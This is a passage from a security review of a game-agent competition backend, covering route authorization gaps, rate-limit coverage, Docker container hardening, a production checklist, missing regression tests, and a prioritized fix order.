| GET | `/users` | CurrentAdmin | Admin | **C-2** |
| GET | `/users/{id}` | CurrentAdmin | Admin | **C-2** |
| PATCH | `/users/{id}/role` | CurrentAdmin | Admin | **C-2** |
| DELETE | `/users/{id}` | CurrentAdmin | Admin | **C-2** |
| PATCH | `/users/{id}/verify-email` | CurrentAdmin | Admin | **C-2** |
| GET | `/agents/leaderboard/{game}` | Anon | Guest+ or public exception | **H-2**, **M-4** |
| GET | `/agents` | CurrentUser | Guest+ own / Admin all | ok read |
| GET | `/agents/{id}` | CurrentUser owner/admin | owner/admin or WorkerKey | **C-2** (worker needs read) |
| POST | `/agents` | CurrentUser | User+ | **H-1** |
| PATCH | `/agents/{id}` | CurrentUser owner/admin | User+ owner/admin | **H-1**, **H-5** stats |
| DELETE | `/agents/{id}` | CurrentUser owner/admin | User+ owner/admin | **H-1** |
| GET | `/submissions` | CurrentUser | User+ own | ok read |
| GET | `/submissions/{id}` | CurrentUser owner/admin | owner/admin or WorkerKey | **C-2** |
| GET | `/submissions/{id}/download` | CurrentUser owner/admin | owner/admin or WorkerKey | **C-2**, **M-2** |
| POST | `/submissions` | CurrentUser | User+ | **H-1**, **H-4** |
| DELETE | `/submissions/{id}` | CurrentUser owner/admin | User+ owner/admin | **H-1**, **M-2** |
| GET | `/matches/scheduler/config` | CurrentUser + role check | Admin | **C-2** |
| PUT | `/matches/scheduler/config` | CurrentUser + role check | Admin | **C-2** |
| POST | `/matches` | CurrentUser | User+ | **H-1**, **M-1** ownership |
| GET | `/matches/{id}` | Anon | Guest+ or public exception | **H-2** |
| GET | `/matches` | Anon | Guest+ or public exception | **H-2**, **M-4** |
| GET | `/matches/{id}/stream` | Anon | Guest+ (+ conn limit) | **H-2** SSE DoS |
| PATCH | `/matches/{id}` | Anon | WorkerKey | **C-1** |
| GET | `/jobs/build/{id}` | Anon | WorkerKey/owner | **H-2** |
| PATCH | `/jobs/build/{id}` | Anon | WorkerKey | **C-1** |
| POST | `/jobs` | Anon | WorkerKey/Admin or remove | **C-1/L-3** |
| GET | `/jobs/match/{id}` | Anon | WorkerKey/owner | **H-2** |
| PATCH | `/jobs/match/{id}` | Anon | WorkerKey | **C-1** |
| GET | `/agent_containers` | CurrentUser (own/admin) | Guest+/Admin | ok; **M-4** limit |
| POST | `/agent_containers/upsert` | Anon | WorkerKey | **C-1** |
| PATCH | `/agent_containers/{id}` | Anon | WorkerKey | **C-1** |

---

# Rate-limit coverage matrix

| Category | Required default | Current | Gap |
|---|---|---|---|
| Login | `10/min + 60/hour` | `30/min;200/day` (IP) | too loose / wrong window |
| Register | `6/min + 40/hour` | `20/hour` (IP) | missing minute burst |
| Email verify / pw reset | `6/min + 20/hour` | mixed `10/min`,`10/hour`,`5/min`,`10/day` | inconsistent |
| Authenticated reads | `600/min + 10000/hour` | global `500/hour;30/min` IP only | not user-keyed; too low |
| Profile | `120/min` | `60/min`, `15/day` | not aligned |
| General user mutations | `120/min + 2000/hour` | global default only | not categorized |
| Submission upload | `10/min + 60/hour` | global default only | needs explicit + small |
| Match creation | `20/min + 200/hour` | global default only | needs explicit |
| Match stream attempts | `60/min` | global default only | SSE conn cap missing |
| Worker callbacks | `1200/min` | global `30/min` **throttles workers** | needs key-keyed/high |
| Admin / API-key | `20000/min` or exempt | `1000/hour` hard-coded | not configurable |
| `RATE_LIMITING_ENABLED=false` | disables all | present (`config.py:38`, wired `main.py:45-49`) | ok |
| `RATE_LIMIT_BYPASS` (dev/test only) | reject in prod | **missing** | add + prod reject |
| `DISABLE_IP_RATE_LIMITING` | keep user-id limits | **missing** | add keyed strategy |
| `TRUST_PROXY_HEADERS=false` default | trust only when set | **missing** | add before trusting client IP |

---

# Orchestration / container execution

**Positive controls (keep).** Runtime match containers are well hardened in
`orchestration/secure_default_settings.yaml`: `cap_drop: [ALL]`, `no-new-privileges`, `read_only: true`,
`tmpfs noexec,nosuid,nodev`, `pids_limit: 256`, `mem_limit: 512m`, `nano_cpus: 1 CPU`,
`network_mode: none`. Runtime logs capped at 5 MiB (`agent_runner.py:15,100-108`). ZIP extraction has a
path-traversal guard (`agent_builder.py:25-34`).

**Risks (this review).**
- Build-time network enabled + untrusted `pip` execution (**H-7**).
- No ZIP-bomb / file-count / uncompressed-size limits (**H-4**).
- Post-build syntax-check container `client.containers.run(...)` at `agent_builder.py:239-243` does
  **not** pass the secure run kwargs (no `network_mode=none`, no caps drop, no mem/pid limits) — it runs
  the freshly built untrusted image with default Docker settings. Harden it with the same
  `_build_docker_run_kwargs` defaults.
- Worker runs as `root` with host Docker socket (**H-7**).
- Server-side log/result/game-state are unbounded (**M-3**).

---

# Production-hardening checklist

- [ ] Reject prod if `WORKER_API_KEY` is default/short (M-5).
- [ ] Reject prod if `RATE_LIMIT_BYPASS=true` (H-3/M-5).
- [ ] Add `TRUST_PROXY_HEADERS` (default false); only trust client IP behind a known proxy (H-3).
- [ ] Require `TRUSTED_HOSTS` in production (M-5).
- [ ] Forbid `*` in `ALLOW_ORIGINS` with credentials / in production (M-6).
- [ ] Reject `BYPASS_EMAIL_VERIFICATION=true` at config load in production (M-5).
- [ ] Add upload size + per-user quota settings (H-4).
- [ ] Add max log / result / game-state size settings (M-3).
- [ ] Bound all pagination `limit`s (M-4).
- [ ] Add all rate-limit category defaults to both `.env.example` files (H-3).
- [ ] Isolate Docker-socket workers from the public backend; consider rootless/remote builder (H-7).
- [ ] Move reset token/new password/email into request bodies (H-6).
- [ ] Fix `backend/.env.example` (no `BYPASS_EMAIL_VERIFICATION=True`, no weak JWT example for shared use).

---

# Missing security regression tests

1. Anonymous deny-by-default for every non-lifecycle route.
2. Verified-guest read-only policy (403 on all mutations).
3. Agent/submission ownership enforcement (cross-user 403).
4. Match creation ownership / agent-id policy (M-1).
5. Admin-only user/role management.
6. Worker callbacks require only `x-api-key` (anon/guest/user/admin → 403; key → 200).
7. Worker key cannot access JWT admin routes (C-2).
8. Worker key can still read/download submissions + read agents (C-2 migration).
9. User cannot change elo/wins/losses via `PATCH /agents` (H-5); match completion still updates them.
10. Reset password uses a body, not query params (H-6).
11. Upload max-size + ZIP-bomb + traversal/symlink/file-count rejection (H-4).
12. Submission path containment on download/delete (M-2).
13. Oversized logs/game-state rejected or truncated (M-3).
14. Pagination `limit` capping (M-4).
15. Rate-limit categories present in settings; prod rejects `RATE_LIMIT_BYPASS` (H-3/M-5).
16. SSE connection-attempt limiting (H-2/H-3).

---

# Quick wins vs larger refactors

**Quick wins (contained, high-value):**
1. Add `require_worker_api_key` to all worker callbacks (C-1).
2. Remove the worker→admin fallback in `get_current_user`; add an owner-or-worker dep for the 3 worker
   reads (C-2).
3. Remove stat fields from `AgentUpdate` (H-5).
4. Move reset token/password/email into request bodies (H-6).
5. Require auth on anonymous match/job/leaderboard routes (H-2).
6. Add `Query(ge=…, le=…)` bounds to pagination (M-4).
7. Prod config rejects default worker key + bypass flags (M-5).
8. Apply secure run kwargs to the post-build syntax-check container (orchestration).

**Larger refactors:**
1. Centralized, configurable rate limiter (user-id / IP / API-key key funcs; bypass/IP/proxy toggles) (H-3).
2. Named RBAC policy dependencies (`Guest+`, `User+`, `Admin`) applied uniformly (H-1).
3. Dedicated `/worker/...` router namespace.
4. Upload/build sandbox: size/quota/ZIP-bomb limits, no build network or mirror, build timeouts (H-4/H-7).
5. Object-storage abstraction for submissions (relative keys, containment) (M-2).
6. Per-game `result`/`game_state` schema validation (M-3).
7. Isolate Docker-socket workers off the public host (H-7).

---

# Recommended order of work

1. **C-1 + C-2** — worker auth separation (close the unauthenticated integrity + admin-escalation holes).
2. **H-5, H-6** — trivial, high-value (stat write, secrets-in-URL).
3. **H-1** — guest read-only / User+ mutation policy.
4. **H-2 / M-4** — lock down anonymous reads and bound pagination.
5. Add the regression tests above for everything in 1–4.
6. **H-3** — centralized configurable rate limiting.
7. **H-4 / H-7 / M-2 / M-3** — upload & orchestration hardening.
8. **M-5 / M-6 / config + env examples** — production startup validation.

_No code changed in this pass — this is the review/work list only._
